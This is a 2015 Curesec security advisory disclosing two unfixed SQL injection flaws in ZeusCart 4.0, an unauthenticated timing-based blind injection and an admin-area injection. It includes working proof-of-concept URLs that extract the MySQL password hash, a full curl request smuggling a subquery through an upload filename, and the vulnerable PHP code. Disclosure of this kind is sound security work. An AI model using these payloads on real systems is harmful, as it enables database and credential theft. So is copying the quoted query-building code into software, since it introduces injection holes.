@@ -1,0 +1,173 @@
+ZeusCart 4.0: SQL Injection
+Security Advisory – Curesec Research Team
+
+1. Introduction
+
+Affected Product:   ZeusCart 4.0  
+Fixed in:     not fixed
+Fixed Version Link:   n/a  
+Vendor Contact:   support@zeuscart.com  
+Vulnerability Type:   SQL Injection  
+Remote Exploitable:   Yes  
+Reported to vendor:   08/13/2015  
+Disclosed to public:   09/14/2015  
+Release mode:     Full Disclosure  
+CVE:       n/a  
+Credits     Tim Coen of Curesec GmbH  
+
+2. Vulnerability Description
+
+There are at least two SQL Injections in ZeusCart 4.0, one being a blind
+injection which does not require credentials to be exploited, the other
+being a standard injection in the admin area.
+
+Because the prevention of SQL Injection depends to a large part on
+applying simple filters on most input instead of using prepared
+stamements, it is highly likely that there will be more SQL injection
+vulnerabilities that are not covered here.
+3. Timing based Blind SQL Injection
+
+There is a blind timing based SQL injection into the maincatid argument.
+An attacker does not need to be authenticated to exploit this.
+Proof Of Concept
+
+
+http://localhost/zeuscart-master/index.php?do=featured&action=showmaincatlanding&maincatid=-1
+AND IF(SUBSTRING(version(), 1, 1)=5,BENCHMARK(500000000,version()),null)
+-> true
+
+http://localhost/zeuscart-master/index.php?do=featured&action=showmaincatlanding&maincatid=-1
+AND IF(SUBSTRING(version(), 1, 1)=4,BENCHMARK(500000000,version()),null)
+-> false
+Please note that there is a bug when displaying featured items, so this
+will display an error message or show a blank page. The timing
+difference is still present, and can thus be exploited, but content
+based exploitation is not possible because of this.
+
+Also note that quotes may not be used in the payload, as quotes are
+sanitized. It is still possible to extract data:
+
+http://localhost/zeuscart-master/index.php?do=featured&action=showmaincatlanding&maincatid=-1
+AND IF(ascii(substring((SELECT password from mysql.user limit
+0,1),1,1))=42,BENCHMARK(500000000,version()),null)
+-> true, password hash starts with *
+
+Code
+
+
+        /classes/Core/CFeaturedItems.php:52
+                $maincatid = $_GET['maincatid'];
+        [...]
+                $sql = "SELECT DISTINCT a.category_name AS
+Category,a.category_id AS maincatid, b.category_name AS SubCategory,
+b.category_id as subcatid, b.category_image AS image FROM category_table
+a INNER JOIN category_table b ON a.category_id = b.category_parent_id
+WHERE b.category_parent_id=".$maincatid." AND b.category_status=1 ";
+
+4. SQL Injection in Admin Area
+
+All GET, POST, and REQUEST input is sanitized via filter_var($value,
+FILTER_SANITIZE_STRING), which offers some protection against SQL
+injection and XSS, but is not recommended as only defense.
+
+For many queries, there is no further defense via escaping or prepared
+statements. This makes all queries that get their data from different
+sources than GET, POST, and REQUEST - such as FILES -, and all queries
+containing unquoted parameters - such as seen in the blind injection
+above - vulnerable.
+Proof Of Concept
+The steps to reproduce this issue are as following
+
+    Log in as admin
+    Create a new product, using a file name for ufile[0] like:
+"image.jpgblla', description=(SELECT password FROM mysql.user limit
+0,1), image='test
+    Visiting
+http://localhost/zeuscart-master/admin/index.php?do=aprodetail&action=showprod&prodid=PRODUCTID
+will give the result of the injected query.
+
+Curl command to create a new product:
+
+curl -i -s -k  -X 'POST' \
+    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:40.0)
+Gecko/20100101 Firefox/40.0' -H 'DNT: 1' -H 'Content-Type:
+multipart/form-data; boundary=--------2025782171' \
+    -b 'PHPSESSID=hsa73tae4bq4ev381430dbfif0' \
+    --data-binary $'----------2025782171\x0d\x0aContent-Disposition:
+form-data; name=\"selcatgory[]\"\x0d\x0a\x0d\x0aChoose
+Category\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data;
+name=\"selcatgory[]\"\x0d\x0a\x0d\x0a25\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data;
+name=\"product_title\"\x0d\x0a\x0d\x0aMYTESTPRODUCT2\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data;
+name=\"sku\"\x0d\x0a\x0d\x0a77\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data;
+name=\"txtweight\"\x0d\x0a\x0d\x0a77\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data;
+name=\"status\"\x0d\x0a\x0d\x0aon\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data; name=\"ufile[0]\"; filename=\"image.jpgblla\',
+description=(SELECT password FROM mysql.user limit 0,1),
+image=\'test\"\x0d\x0aContent-Type:
+image/jpeg\x0d\x0a\x0d\x0acontent\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data;
+name=\"price\"\x0d\x0a\x0d\x0a555\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data;
+name=\"msrp_org\"\x0d\x0a\x0d\x0a555\x0d\x0a----------2025782171\x0d\x0aContent-Disposition:
+form-data;
+name=\"soh\"\x0d\x0a\x0d\x0a555\x0d\x0a----------2025782171--\x0d\x0a' \
+
+'http://localhost/zeuscart-master/admin/index.php?do=productentry&action=insert'
+Code
+
+
+        CProductEntry.php:313
+                            $imgfilename= $_FILES['ufile']['name'][$i];
+
+                            $imagefilename =
+date("Y-m-d-His").$imgfilename ; // generate a new name
+
+                            $image="images/products/". $imagefilename;
+// updated into DB
+        [...]
+
+                            if($i==0)
+                            {
+                                $imgType='main';
+                                $update="UPDATE products_table set
+image='$image',thumb_image='$thumb_image',large_image_path='$large_image' where
+product_id='".$product_id."'";
+                                $obj->updateQuery($update);
+                            }
+                            else
+                            {
+                                $imgType='sub';
+                            }
+
+                                if($_FILES['ufile']['name'][$i]!='')
+                                {
+                                    $query_img="INSERT INTO
+product_images_table(product_id,image_path,thumb_image_path,type,large_image_path)
+VALUES('".$product_id."','$image','$thumb_image','$imgType','$large_image')";
+
+                                    $obj_img=new Bin_Query();
+
+                                    $obj_img->updateQuery($query_img);
+                                }
+
+
+                        }
+
+5. Solution
+
+This issue was not fixed by the vendor.
+
+6. Report Timeline
+
+08/13/2015   Informed Vendor about Issue (no reply)
+09/07/2015   Reminded Vendor of release date (no reply)
+09/14/2015   Disclosed to public
+
+7. Blog Reference:
+http://blog.curesec.com/article/blog/ZeusCart-40-SQL-Injection-56.html
+
